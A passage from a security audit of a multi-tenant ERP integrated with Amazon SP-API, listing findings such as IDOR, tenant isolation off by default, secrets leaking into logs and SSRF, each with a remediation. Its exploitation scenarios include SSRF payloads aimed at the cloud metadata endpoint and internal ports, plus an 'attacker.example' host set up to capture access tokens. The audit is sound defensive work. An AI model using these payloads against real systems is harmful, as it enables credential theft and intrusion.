**Remediação.** Tornar CONFIG_ENCRYPTION_KEY e TENANT_ISOLATION=enforce obrigatórios em produção: fail-fast no boot se NODE_ENV=production e a chave estiver ausente OU TENANT_ISOLATION!=enforce (com >1 empresa). Documentar no deploy. Migrar/recifrar quaisquer segredos legados em texto puro. Forçar sslmode=require na DATABASE_URL (em transito). Confirmar cifragem at-rest no nível do Postgres/disco da VPS.

**Relevância Amazon DPP.** Atinge dois pilares DPP: Encryption (segredos/OAuth at-rest) e Isolamento entre sellers. Default 'fail-open' de isolamento é o risco cross-tenant que a Amazon trata como bloqueador; chave de cifragem vazia reprova o critério de credenciais cifradas.

**Verificação adversarial.** Both sub-findings are real and anchored in code read directly:

**Sub-finding 1 — CONFIG_ENCRYPTION_KEY empty default:**
- `.env.example` L37: `CONFIG_ENCRYPTION_KEY=""` — empty default confirmed.
- `crypto.ts` L38-44 (`requireEncryptionKeyForSecret`): throws in production only on the SAVE path (`encryptConfigValue`), preventing new secrets from being stored in plaintext. This is a partial control.
- `crypto.ts` L69-71 (`decryptConfigValue`): if stored value lacks the `enc:` prefix it is returned as-is (legacy plaintext passthrough) — confirmed.
- `scripts/amazon-worker.ts` L8-15: there IS a `process.exit(1)` fail-fast for the worker process when `NODE_ENV=production` and the key is absent. This is a genuine mitigation the auditor did not acknowledge, BUT it only covers the `erp-worker` PM2 process. The Next.js web server (`erp-web`, `deploy/ecosystem.config.js`) has NO equivalent boot-time check — no `src/instrumentation.ts`, no startup validation in `layout.tsx` or `db.ts`. The web process boots and serves traffic without the key; any attempt to save a secret via the UI returns a 4…

---

### F05 · [HIGH] Senha de convite (admin do tenant) aceita 8 chars sem complexidade — diverge da política forte

- **Dimensão:** authn-session · **Categoria:** Identification and Authentication Failures · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/app/api/definir-senha/route.ts:13-16, 53`

**Descrição.** O endpoint que define a PRIMEIRA senha de um usuário convidado (tipicamente o ADMIN de uma empresa/tenant recém-criada) valida `novaSenha: z.string().min(8).max(200)` — apenas 8 caracteres, sem exigir maiúscula/minúscula/número/especial. O formulário cliente (src/app/definir-senha/form.tsx L15) também só checa `senha.length < 8`. Isso contrasta com TODO o resto do sistema, que usa `strongPasswordSchema` (min 12 + 4 classes de caractere) em src/lib/password-policy.ts — aplicado em redefinir-senha (token de reset) e alterar-senha. Ou seja, a conta mais privilegiada de cada tenant pode ser criada com a senha mais fraca do sistema. bcrypt(12) protege o hash em repouso, mas não compensa uma senha de 8 chars contra credential stuffing / brute-force online (mesmo com o throttle de 8/15min, senhas de 8 chars sem complexidade são previsíveis).

**Cenário de exploração.** 1. Superadmin cria empresa X e convida admin@x.com; o sistema gera link de convite. 2. O admin define 'senha123' (8 chars, passa no min(8)). 3. Atacante que conheça o slug e o email tenta credential stuffing / dicionário no /api/auth/login; com senha curta e previsível a chance de sucesso sobe muito comparado a uma senha de 12 chars com complexidade. 4. Comprometida a conta ADMIN do tenant, o atacante tem acesso total aos dados daquele seller (incluindo PII de pedidos Amazon e credenciais OAuth conectadas).

**Remediação.** Trocar `novaSenha: z.string().min(8).max(200)` por `novaSenha: strongPasswordSchema` em src/app/api/definir-senha/route.ts (import de @/lib/password-policy), e atualizar o form para usar `validatePasswordClient`. Garantir consistência: TODO fluxo que define senha (login inicial, convite, reset, alteração) deve usar a mesma política de 12+ caracteres com complexidade.

**Relevância Amazon DPP.** ALTO. O questionário de segurança da Amazon DPP cobra política de senha forte e consistente para todas as contas com acesso a dados protegidos, especialmente contas administrativas. Uma política de 8 chars sem complexidade no fluxo de provisionamento do admin do tenant é exatamente o tipo de inconsistência que reprova a avaliação e enfraquece o controle de acesso aos dados de PII de comprador e aos tokens OAuth SP-API conectados pelo seller.

**Verificação adversarial.** The vulnerability is real and directly confirmed by reading the source files.

Evidence:
- src/app/api/definir-senha/route.ts, line 15: `novaSenha: z.string().min(8).max(200)` — only an 8-character minimum, zero complexity requirement. No import of `strongPasswordSchema` anywhere in this file.
- src/app/definir-senha/form.tsx, line 15: client-side guard is also just `senha.length < 8` — the frontend mirrors the same weak policy.
- By contrast, src/app/api/auth/redefinir-senha/route.ts line 14 and src/app/api/auth/alterar-senha/route.ts line 19 both import and apply `strongPasswordSchema` (min 12 chars + uppercase + lowercase + digit + special character, defined in src/lib/password-policy.ts lines 8–15).

There is no middleware or upstream guard that compensates for the missing complexity enforcement on this specific route. The `originViolationResponse` check (line 19 of the route) only validates request origin, not password strength. The rate-limit applied (`consumeRateLimit("definir-senha:<ip>", 15min, 10)`) protects the invite consumption endpoint itself, but does not help once a w…

---

### F06 · [HIGH] Isolamento multi-tenant e no-op por padrao (TENANT_ISOLATION=off) — todo o RBAC object-level depende de uma flag desligada

- **Dimensão:** authz-rbac-idor · **Categoria:** Broken Access Control / Multi-Tenant Isolation · **Confiança:** high
- **Severidade (auditor → verificador):** CRITICAL → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/lib/db.ts:303-365`

**Descrição.** applyTenantIsolation retorna query(args) SEM TOCAR EM NADA quando tenantMode()==='off' (linhas 312-314), e o default e 'off' (linhas 153-156: so vira enforce se a env for exatamente 'enforce'). A flag TENANT_ISOLATION nao aparece em .env.example, e a memoria do projeto indica multi-tenant GATED/nao-deployado — logo a producao roda em 'off'. Como NENHUM route handler /api/**/[id] reescreve where.empresaId por conta propria (confirmado em contas, contas-a-receber, movimentacoes, notificacoes, produtos, documentos-financeiros, vendas/custos-eventuais, ads-optimizer), o unico mecanismo de isolamento entre empresas e essa extensao — que esta desligada. Hoje e single-tenant (sem dano direto), mas e uma bomba-relogio: ao habilitar o 2o seller sem antes ligar+validar o enforce, todos os lookups por id passam a vazar entre tenants.

**Cenário de exploração.** 1) Dono onboarda o seller B (multi-seller, objetivo do OAuth Amazon) sem setar TENANT_ISOLATION=enforce (ou setando mas com os bugs de select abaixo). 2) Usuario do seller A autentica e chama GET /api/produtos/<id-do-B>/vendas, GET /api/documentos-financeiros/<id-do-B>/arquivo, DELETE /api/contas/<id-do-B>, etc. 3) Como o where so tem {id} e a extensao e no-op, o Prisma retorna/mutaciona o registro do seller B. Vazamento e adulteracao cross-tenant generalizados.

**Remediação.** Tornar enforce o comportamento de producao (default seguro: tratar ausencia/qualquer valor != 'enforce' como FAIL-CLOSED em producao, ou exigir explicitamente a flag). Documentar TENANT_ISOLATION em .env.example. Bloquear o onboard de empresa externa por gate de deploy ate o enforce estar ligado e coberto por teste e2e com 2 empresas (ja existe scripts/test-isolamento-2-empresas.ts — torna-lo obrigatorio no CI/deploy).

**Relevância Amazon DPP.** Bloqueador absoluto. A Amazon DPP exige isolamento de dados entre tenants para multi-seller; um mecanismo de isolamento que esta desligado por padrao e nao validado em runtime reprova o questionario de seguranca e impede a autorizacao OAuth SP-API para clientes terceiros.

**Verificação adversarial.** O achado é confirmado com base em leitura direta dos arquivos relevantes.

**Evidências concretas:**

1. **`tenantMode()` default é "off"** (src/lib/db.ts L153-156): retorna "off" quando `TENANT_ISOLATION` é ausente ou qualquer valor != "enforce". Confirmado.

2. **`applyTenantIsolation` é no-op em "off"** (L312-314): `return query(args)` sem qualquer mutação de args ou injeção de `empresaId`. Confirmado.

3. **`TENANT_ISOLATION` ausente de `.env.example`**: busca Grep confirmou zero ocorrências. A chave não está documentada para operadores.

4. **`deploy/ecosystem.config.js` não define `TENANT_ISOLATION`**: apenas `NODE_ENV=production`. Logo produção roda em "off". Confirmado.

5. **Handlers de rota não injetam `empresaId` por conta própria**: confirmado em múltiplas rotas lidas (contas/[id]/route.ts, documentos-financeiros/[id]/arquivo/route.ts, contas-a-receber/[id]/route.ts, vendas/[vendaId]/custos-eventuais/route.ts, notificacoes/[id]/route.ts). Todas delegam a lookup por `{id}` puro, dependendo inteiramente da extensão Prisma para isolamento.

**Mitigações que existem mas não i…

---

### F07 · [HIGH] findUnique com select restrito (sem empresaId) quebra/anula o isolamento em modo enforce

- **Dimensão:** authz-rbac-idor · **Categoria:** Broken Access Control / Multi-Tenant Isolation · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:19-27`

**Descrição.** A extensao valida tenant em findUnique APENAS pos-fetch lendo result.empresaId (db.ts 372-388); se o campo nao estiver no select ela LANCA erro de fail-closed (db.ts 377-383). Varias rotas chamam findUnique com select que NAO inclui empresaId: documentos-financeiros/[id]/arquivo seleciona {id,nomeArquivo,caminhoArquivo,mimeType}; produtos/[id]/vendas e produtos/[id]/reembolsos e buybox-historico selecionam {sku}; vendas/[vendaId]/custos-eventuais seleciona {id}. Consequencia: em enforce essas rotas ou QUEBRAM (throw) ou — se o select fosse sem restricao — passariam pela validacao. Isto prova que o modo enforce nunca foi exercitado nesses caminhos (o desenvolvedor nao escopou tenant aqui), e que o isolamento 'pronto' e ilusorio. Em off, sao lookups globais por id (IDOR latente).

**Cenário de exploração.** Com TENANT_ISOLATION=enforce ligado de boa-fe: GET /api/documentos-financeiros/<id>/arquivo lanca excecao 500 (fail-closed por empresaId ausente no select) — DoS funcional. Sem o enforce (off): qualquer usuario logado baixa o arquivo financeiro de qualquer empresa por id (ver finding documentos-arquivo-idor). Em ambos os casos o controle de acesso por objeto esta ausente na rota.

**Remediação.** Incluir empresaId em TODO select de findUnique sobre modelos TENANT, e/ou trocar findUnique({where:{id}}) por findFirst({where:{id, empresaId: <do contexto>}}) com escopo explicito. Adicionar teste de enforce cobrindo cada rota [id]. Idealmente padronizar um helper buscarDoTenant(model,id) que sempre injeta empresaId.

**Relevância Amazon DPP.** Alta. Demonstra que o controle de isolamento alegado nao e operacional; um avaliador da Amazon que ligue o enforce vera falhas/erros, e na pratica os dados (incluindo documentos com CNPJ/dados de fornecedor) nao estao escopados por seller.

**Verificação adversarial.** The finding is confirmed with calibration. Reading the relevant files reveals the following:

1. db.ts lines 372-388: The tenant extension for findUnique does pós-fetch validation of empresaId. If the field is absent from the result (because the caller used a restrictive select), it deliberately throws: "[tenant-isolation] ${model}.${operation}: não foi possível validar empresaId pós-fetch (campo ausente no resultado — verifique o select). Abortando para evitar vazamento entre tenants." This is intentional fail-closed design.

2. documentos-financeiros/[id]/arquivo/route.ts lines 19-27: Calls db.documentoFinanceiro.findUnique with select: {id, nomeArquivo, caminhoArquivo, mimeType} — empresaId is absent from the select. With TENANT_ISOLATION=enforce this throws, which propagates to the catch block at line 82, logs the error, and returns HTTP 500. This is a functional DoS on that endpoint in enforce mode.

3. The other routes cited (produtos/[id]/vendas, produtos/[id]/reembolsos, buybox-historico, vendas/[vendaId]/custos-eventuais) all call db.produto.findUnique or db.vendaAmazon.find…

---

### F08 · [HIGH] Download de documento financeiro (NF/boleto) por id sem checagem de dono — IDOR de PII/dados fiscais

- **Dimensão:** authz-rbac-idor · **Categoria:** Broken Access Control / IDOR · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:12-46`

**Descrição.** GET serve o arquivo bruto (PDF/imagem de NF e boleto — contem CNPJ, razao social de fornecedor, valores, e potencialmente nome/endereco) apos apenas requireSession() (linha 14) e findUnique({where:{id}}) sem qualquer escopo de empresa/usuario (linhas 19-27). Nao ha verificacao de ownership. A protecao path-traversal existe (38-46) mas nao impede acessar o documento de OUTRO tenant — so impede sair de uploads/. No proxy, /api/documentos-financeiros esta em FINANCE_PATH_PREFIXES, mas canAccessPath libera GET para qualquer papel nao-LEITURA-mutante (inclusive OPERADOR e LEITURA), pois nao esta em ADMIN_PATH_PREFIXES.

**Cenário de exploração.** Usuario autenticado de baixo privilegio (ou, pos multi-seller, do seller A) itera ids/cuid de documentos e chama GET /api/documentos-financeiros/<id>/arquivo?download=1, baixando NFs/boletos de outras empresas — exfiltracao de dados fiscais e potencial PII de terceiros.

**Remediação.** Escopar o findUnique por empresa (findFirst({where:{id, empresaId}})) e, idealmente, por papel financeiro (requireRole FINANCEIRO/ADMIN). Incluir empresaId no select para o isolamento pos-fetch funcionar sob enforce.

**Relevância Amazon DPP.** Alta. Exposicao cross-tenant de documentos financeiros (e possivel PII em anexos) viola least-privilege e isolamento de dados da DPP. Mesmo single-tenant, expor docs financeiros a papeis nao-financeiros e least-privilege fraco.

**Verificação adversarial.** The route `src/app/api/documentos-financeiros/[id]/arquivo/route.ts` (lines 12-89) does exactly what the auditor described: it calls `requireSession()` only, then `db.documentoFinanceiro.findUnique({ where: { id }, select: { id, nomeArquivo, caminhoArquivo, mimeType } })` — no `empresaId` constraint anywhere in the query.

The tenant-isolation extension in `src/lib/db.ts` (lines 372-388) handles `findUnique` on TENANT_MODELS (DocumentoFinanceiro is listed at line 54) with a post-fetch check: it fetches the row, then validates that `result.empresaId === empresaId`. Crucially, if `empresaId` is NOT present in the `select` (which is exactly this route's case), the extension throws a fail-closed error at line 378: `"não foi possível validar empresaId pós-fetch (campo ausente no resultado)"`. This prevents the data leak — but only when `TENANT_ISOLATION=enforce`.

The default and current deployment mode is `"off"` (the variable does not appear in `.env.example`, and db.ts line 312 confirms that in `"off"` mode the extension is a total no-op: `return query(args)`). In `"off"` mode there is…

---

### F09 · [HIGH] Download de documentos financeiros (PII) exige apenas sessao e e servido inline com Content-Type controlado pelo upload

- **Dimensão:** file-upload · **Categoria:** Broken Access Control · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:14 (requireSession) e 62-80 (Content-Disposition inline + Content-Type = doc.mimeType)`

**Descrição.** Todos os outros endpoints de documentos financeiros exigem requireRole(UsuarioRole.FINANCEIRO) (route.ts L27/L123, vincular-conta L11). Mas o GET que efetivamente entrega o BINARIO do documento (boletos/NFs com PII de fornecedor e potencialmente comprador) usa apenas requireSession() — qualquer usuario autenticado cuja role passe pelo RBAC de path do proxy (LEITURA inclusive, pois /api/documentos-financeiros esta em FINANCE_PATH_PREFIXES e GET nao e mutating) consegue baixar qualquer documento por id. Alem disso, o arquivo e servido com Content-Disposition: inline e Content-Type = doc.mimeType (mimeType e o tipo DECLARADO no upload, persistido em L884 do service). Embora a allowlist limite mimeType a imagem/pdf e o header global nosniff mitigue sniffing, servir inline um PDF que pode conter JavaScript de um id sequencial-adjacente amplia a superficie. O id e CUID (nao enumeravel trivialmente), o que reduz, mas nao elimina, o risco.

**Cenário de exploração.** 1. Usuario com role LEITURA (somente-leitura, sem permissao de negocio sobre financeiro) autentica. 2. Obtem/descobre um id de DocumentoFinanceiro (ex. via outra tela, log, ou referencia em payload de dossie). 3. GET /api/documentos-financeiros/<id>/arquivo retorna o boleto/NF com dados pessoais do fornecedor, fora do escopo de autorizacao pretendido para a role.

**Remediação.** Trocar requireSession() por requireRole(UsuarioRole.FINANCEIRO) para alinhar com os endpoints irmaos; forcar Content-Disposition: attachment (ou ao menos para application/pdf) para evitar renderizacao inline; manter o select incluindo empresaId e validar tenant explicitamente (ver finding tenant-context). Considerar Content-Type fixo derivado da extensao validada em vez do mimeType declarado.

**Relevância Amazon DPP.** Relevante. A DPP exige least-privilege e controle de acesso a PII; um endpoint que entrega documentos com PII sob autenticacao generica (em vez do papel adequado) e exatamente o tipo de lacuna de autorizacao que o questionario de seguranca Amazon penaliza.

**Verificação adversarial.** The finding is real and exploitable as described. Evidence from code:

1. PROXY RBAC DOES NOT BLOCK LEITURA on this endpoint. In proxy.ts (line 225-227), for role LEITURA the gate is: `return !MUTATING_METHODS.has(method) && !matchesPrefix(pathname, ADMIN_PATH_PREFIXES)`. For a GET on /api/documentos-financeiros/[id]/arquivo: MUTATING_METHODS.has("GET") = false, and /api/documentos-financeiros is NOT in ADMIN_PATH_PREFIXES — so the expression evaluates to `true && true = true`. LEITURA passes the proxy.

2. The route handler at src/app/api/documentos-financeiros/[id]/arquivo/route.ts line 14 calls only `requireSession()`, not `requireRole(UsuarioRole.FINANCEIRO)`. Every sibling endpoint enforces FINANCEIRO: the main route.ts at lines 27 (GET) and 123 (POST), and vincular-conta/route.ts at line 11 (POST).

3. The Prisma query (lines 19-27) uses `db.documentoFinanceiro.findUnique({ where: { id } })` with no empresaId tenant filter. A LEITURA user from tenant A can request a document CUID belonging to tenant B — no cross-tenant isolation at the handler level. This compounds the authoriz…

---

### F10 · [HIGH] $queryRaw/$executeRaw/$queryRawUnsafe escapam completamente do filtro de tenant

- **Dimensão:** multi-tenant · **Categoria:** Broken Access Control / Multi-Tenant Isolation · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/lib/db.ts:417-431`

**Descrição.** A extensao registra apenas `query: { $allModels: { $allOperations } }` (L418-429). $queryRaw, $queryRawUnsafe, $executeRaw e $executeRawUnsafe sao metodos de CLIENTE (top-level), nao operacoes de model — portanto NUNCA passam por applyTenantIsolation. Qualquer SQL cru roda sem injecao de empresaId mesmo com TENANT_ISOLATION=enforce. Em uso real: src/app/api/sistema/db-stats/route.ts faz db.notificacao.count() e $queryRaw contando linhas de pg_stat_user_tables / COUNT(*) por tabela inteira (L73-91, L140-147) sem nenhum recorte por empresa, expondo volume agregado de dados de todos os tenants a um ADMIN de um unico tenant. Scripts diag-* tambem usam raw amplamente.

**Cenário de exploração.** Com enforce ligado e multi-tenant ativo: 1) ADMIN do seller B acessa /api/sistema/db-stats (rota requer apenas requireRole(ADMIN), e B e admin da propria empresa). 2) A resposta inclui contagem total de notificacoes, settlements, contas a receber pendentes e tamanho do banco — numeros agregados de TODOS os sellers. 3) Pior: se qualquer feature futura usar $queryRawUnsafe com input parametrizavel por usuario, retorna linhas cruas de outros tenants sem filtro.

**Remediação.** Banir $queryRaw*/$executeRaw* em codigo de runtime multi-tenant (lint rule). Onde raw e inevitavel, exigir clausula explicita `WHERE "empresaId" = $1` com o empresaId de getEmpresaId() e fail-closed se ausente. Restringir /api/sistema/db-stats a superadmin de plataforma (cookie erp_plat_session), nao a ADMIN de tenant, ou escopar todos os counts por empresaId.

**Relevância Amazon DPP.** Relevante: rotas raw que cruzam tenants violam o isolamento exigido pela DPP. Mesmo metadados agregados (volume de pedidos/financeiro de outro seller) sao dados de negocio de terceiro que nao devem ser expostos.

**Verificação adversarial.** The finding is confirmed with reduced scope. The technical claim is accurate: `$queryRaw`/`$queryRawUnsafe`/`$executeRaw`/`$executeRawUnsafe` are top-level PrismaClient methods, not model operations, and they are provably never intercepted by the `$extends({ query: { $allModels: { $allOperations } } })` hook at `db.ts:417-431`. This is a structural gap in the extension design.

At `/api/sistema/db-stats/route.ts`:
- Lines 24-45 (`statsPostgres`): `db.$queryRaw` executes `SELECT pg_database_size(current_database())` and `SELECT … FROM pg_stat_user_tables` — these return aggregated stats for the ENTIRE database, crossing all tenant boundaries.
- Lines 73-91 (`statsSqlite`): `db.$queryRaw` lists all tables; `db.$queryRawUnsafe` counts rows per table — again, cross-tenant totals.
- Lines 140-147: `db.notificacao.count()`, `db.contaReceber.count()`, `db.buyBoxSnapshot.count()` etc. ARE ORM model operations that pass through the extension. Because `getSession()` in `auth.ts:57` calls `enterWithTenant` when verifying the session cookie, the AsyncLocalStorage tenant context IS populated for …

---

### F11 · [HIGH] Email em modo DEV loga link de reset de senha, código 2FA e token de convite em texto claro (mais email destinatário)

- **Dimensão:** pii-logging-exposure · **Categoria:** Sensitive Data Exposure / Insertion of Sensitive Information into Log File · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/lib/email.ts:69-97`

**Descrição.** Quando SMTP_HOST/USER/PASS não estão configurados (getTransporter retorna null), enviarEmail entra em 'modo dev' e emite logger.info com { to, subject, textPreview } onde textPreview = (input.text ?? input.html.replace(/<[^>]+>/g,'')).slice(0,400). Os corpos HTML embutem segredos como TEXTO dentro do body: em src/app/api/auth/recuperar-senha/route.ts L99 o link de reset (`/redefinir-senha?token=${tokenPlain}`) aparece dentro de <code>...</code>; em src/app/api/auth/login/route.ts L134 o código 2FA de 6 dígitos aparece em <p>${codigo}</p>; em src/lib/email-convite.ts L15-28 o link de definir-senha com rawToken aparece no href. Após strip de tags, esses segredos sobrevivem nos primeiros 400 chars do textPreview e vão para o log. A lista REDACT_PATHS do pino (src/lib/logger.ts) só redige por NOME DE CAMPO (token/codigo/...), não consegue mascarar um token que é SUBSTRING do valor de 'textPreview'. Além disso, o campo 'to' (email = PII) é sempre logado no modo dev, e no caminho de falha real (L95) o logger.error inclui { err, to, subject }. Conforme o CLAUDE.md o ambiente local e a VPS podem operar sem SMTP, ativando esse caminho.

**Cenário de exploração.** 1) Sistema roda sem SMTP configurado (dev/staging/VPS recém-provisionada). 2) Usuário pede 'esqueci minha senha'; recuperar-senha gera tokenPlain e chama enviarEmail. 3) O log estruturado registra textPreview contendo `http://app/redefinir-senha?token=<64-hex>` em texto claro. 4) Quem tiver acesso aos logs (operador, agregador de logs, arquivo .log, n8n/observador na VPS) lê o token e redefine a senha da vítima antes da expiração de 1h — takeover de conta. O mesmo vale para o código 2FA (bypass de segundo fator) e para o token de convite de admin de empresa (acesso inicial a um tenant). Os emails dos destinatários também ficam acumulados nos logs (PII).

**Remediação.** Nunca logar corpo/preview de emails que possam conter segredos. No modo dev, logar apenas metadados não-sensíveis (to mascarado via uma função tipo mascararDestino, subject) e remover textPreview — ou gerar o preview a partir de uma versão do template com placeholders. Remover input.to do logger.error de falha (ou mascarar). Idealmente, mover a renderização de tokens para fora do corpo logável e tratar todo conteúdo de email como sensível por padrão.

**Relevância Amazon DPP.** ALTA. A Amazon DPP exige minimização e proibição de registrar credenciais/segredos e PII em texto claro, com logging e monitoramento adequados. Logar tokens de autenticação e emails de usuários em arquivos de log viola diretamente o requisito de 'não logar segredos/PII' e seria um apontamento provável no questionário de segurança.

**Verificação adversarial.** All claims in the finding are verified by direct code reading:

1. email.ts lines 69-82: When SMTP is not configured (transporter is null), logger.info is called with { to, subject, textPreview } where textPreview = (input.text ?? input.html.replace(/<[^>]+>/g, "")).slice(0, 400). This strips HTML tags and takes the first 400 characters.

2. recuperar-senha/route.ts line 86: `const link = \`${baseUrl}/redefinir-senha?token=${tokenPlain}\`` - the 64-hex plaintext token is interpolated into the href attribute of an anchor tag and also into a <code> element (line 99). After tag stripping, the URL "http://.../redefinir-senha?token=<64hex>" appears as literal text in the first 400 chars of textPreview and is logged in full.

3. login/route.ts line 134: The 6-digit OTP `codigo` is placed inside `<p style="...32px...">${codigo}</p>`. After HTML tag stripping (the regex /&lt;[^&gt;]+&gt;/g removes tags but not text content), the 6-digit code survives as plain text in the preview.

4. email-convite.ts lines 15-16: rawToken is embedded in the href URL. After tag stripping the surrounding HTML,…

---

### F12 · [HIGH] SSRF via URL configuravel do WAHA (whatsapp_estoque_waha_url) com exfiltracao via botao de teste

- **Dimensão:** ssrf-outbound · **Categoria:** Server-Side Request Forgery (SSRF) · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/modules/whatsapp-estoque/waha-client.ts:50-78 (fetch sem validacao de host); schema em src/modules/whatsapp-estoque/schemas.ts:47-54; gatilho em src/app/api/configuracoes/whatsapp-estoque/enviar-teste/route.ts:8-13`

**Descrição.** A funcao enviarTextoWaha faz POST para `${baseUrl}/api/sendText` onde baseUrl = config whatsapp_estoque_waha_url, gravada por ADMIN via POST /api/configuracoes/whatsapp-estoque. A unica validacao (salvarConfigSchema, schemas.ts:47-54) e: trim, max(300) e regex `/^https?:\/\//i` — ou seja, exige apenas o prefixo http(s)://. NAO ha verificacao de host: IPs privados (RFC1918), loopback (127.0.0.1/localhost), link-local/metadata da nuvem (169.254.169.254) e hostnames internos passam livremente. O servidor entao executa fetch() para esse alvo. Confirmei via Grep que NAO existe nenhum guard SSRF em todo o codebase (nenhum bloqueio de 169.254, RFC1918, resolucao DNS ou allowlist de host). Pior: o fetch envia o segredo X-Api-Key (waha-client.ts:67) ao destino arbitrario, e quando a resposta nao e ok, o erro retornado inclui o corpo do alvo: `WAHA respondeu ${status}: ${corpo.slice(0,200)}` (waha-client.ts:89). Esse erro e persistido em WhatsAppEstoqueEnvio.erro e devolvido ao chamador pelo endpoint enviar-teste via erro(502, resultado.erro, resultado) — convertendo o SSRF cego em semi-cego com leitura parcial da resposta interna.

**Cenário de exploração.** 1) Atacante e ADMIN de um tenant (em SaaS multi-tenant, todo seller tem seu admin). 2) POST /api/configuracoes/whatsapp-estoque com {ativo:true, wahaUrl:'http://169.254.169.254/latest/meta-data/iam/security-credentials/', destinatario:'5511999999999', horario:'10:00'}. A regex aceita (comeca com http://). 3) Atacante clica 'Enviar teste agora' -> POST /api/configuracoes/whatsapp-estoque/enviar-teste. O servidor faz fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials//api/sendText'). 4) Como a resposta nao e 2xx, o handler devolve no JSON o corpo (ate 200 bytes) da resposta do endpoint de metadata. Variantes: apontar para http://127.0.0.1:3002 (container WAHA), http://127.0.0.1:5678 (n8n), http://127.0.0.1:5432 (Postgres — banner/erro), ou varrer a rede interna da VPS observando status/latencia/corpo. O header X-Api-Key tambem e enviado ao alvo, vazando o segredo do WAHA para qualquer host escolhido.

**Remediação.** Adicionar validacao de SSRF antes de qualquer fetch de saida com host derivado de config/input: (a) parsear a URL e rejeitar esquemas != https (ou http apenas para hosts explicitamente permitidos); (b) resolver o hostname via DNS e bloquear IPs em faixas privadas/loopback/link-local/metadata (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7, etc.) — idealmente reusando uma lib como 'ipaddr.js' e revalidando apos resolucao para evitar DNS rebinding; (c) preferir uma allowlist de hosts confiaveis configurada por env; (d) NUNCA refletir o corpo da resposta do alvo de volta ao cliente — substituir corpo.slice(0,200) por uma mensagem generica; (e) considerar nao enviar X-Api-Key para destinos nao validados. Criar um helper central (ex: src/lib/safe-fetch.ts) e canalizar todos os fetches de host configuravel por ele.

**Relevância Amazon DPP.** ALTO impacto na aprovacao. A Amazon DPP / questionario de seguranca avalia explicitamente protecao contra acesso nao autorizado a infraestrutura e segredos. SSRF que alcanca o endpoint de metadata da nuvem pode vazar credenciais IAM e, por extensao, dar acesso a dados de PII de compradores armazenados (S3, DB). Em ambiente multi-seller, o admin de um tenant pivotando contra a infra compartilhada e exatamente o cenario de isolamento/least-privilege que a DPP exige mitigar. Provavel bloqueador.

**Verificação adversarial.** Every element of the reported finding was verified against the actual source code:

1. VALIDATION GAP (schemas.ts:47-54): The `salvarConfigSchema` accepts any string matching `/^https?:\/\//i` for `wahaUrl`. No host validation, no IP-range block, no allowlist. Confirmed by reading the file directly.

2. FETCH WITHOUT GUARD (waha-client.ts:61, 73-78): `enviarTextoWaha` builds `url = \`${urlBase}/api/sendText\`` and calls `fetch(url, { method:"POST", headers, body, signal })` with zero URL/host validation. The `baseUrl` comes directly from `ConfiguracaoSistema` — whatever the ADMIN saved.

3. RESPONSE BODY REFLECTION (waha-client.ts:80, 89): On any non-2xx response, the function reads `const corpo = await resp.text()` and returns `{ ok:false, erro: \`WAHA respondeu ${resp.status}: ${corpo.slice(0,200)}\` }`. This converts a blind SSRF into a semi-blind one: up to 200 bytes of the internal target's response body are propagated back.

4. FULL EXFILTRATION PATH TO CALLER (jobs.ts:142-146, 152-155 → enviar-teste/route.ts:11): `runWhatsappEstoqueResumo` stores `resultado.erro` in `WhatsAppE…

---

### F13 · [HIGH] SSRF via amazon_endpoint / amazon_ads_endpoint configuravel vazando access token LWA

- **Dimensão:** ssrf-outbound · **Categoria:** Server-Side Request Forgery (SSRF) · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/lib/amazon-sp-api.ts:202-223 (spApiRequest: endpoint de config -> new URL -> fetch com x-amz-access-token); analogo em src/lib/amazon-ads-api.ts:243-274; config gravada sem validacao em src/modules/amazon/service.ts:180-201 e src/app/api/amazon/config/route.ts:34-43`

**Descrição.** spApiRequest usa `const endpoint = creds.endpoint || DEFAULT_ENDPOINT` e monta `new URL(pathname, endpoint)` seguido de fetch com os headers `x-amz-access-token: <LWA token>` (amazon-sp-api.ts:205-223). O valor creds.endpoint vem da config amazon_endpoint (service.ts:237), gravada por ADMIN via POST /api/amazon/config (route.ts:34-43). saveAmazonConfig (service.ts:180-201) aceita amazon_endpoint sem QUALQUER validacao de URL/host — nao e secret, nao passa por nenhum check de formato. Idem amazon_ads_endpoint em adsApiRequest (amazon-ads-api.ts:243-274), que envia `authorization: Bearer <token>` e `amazon-advertising-api-clientid`. Como o token LWA e obtido e anexado a TODA requisicao, apontar o endpoint para um host controlado pelo atacante (ou interno) faz o servidor vazar o access token / client id e permite probing da rede interna.

**Cenário de exploração.** 1) ADMIN do tenant faz POST /api/amazon/config com {amazon_endpoint:'http://169.254.169.254'} (ou 'http://attacker.example' / 'http://127.0.0.1:5678'). Nenhuma validacao rejeita. 2) Na proxima sincronizacao (ou acionando manualmente um endpoint que chama spApiRequest), o worker/handler faz fetch('http://169.254.169.254/...') enviando header x-amz-access-token com o token LWA valido do tenant. 3) O atacante captura o token no seu servidor (caso aponte para host externo) ou usa o canal para varrer servicos internos da VPS. O mesmo vale para amazon_ads_endpoint vazando o Bearer token de Ads.

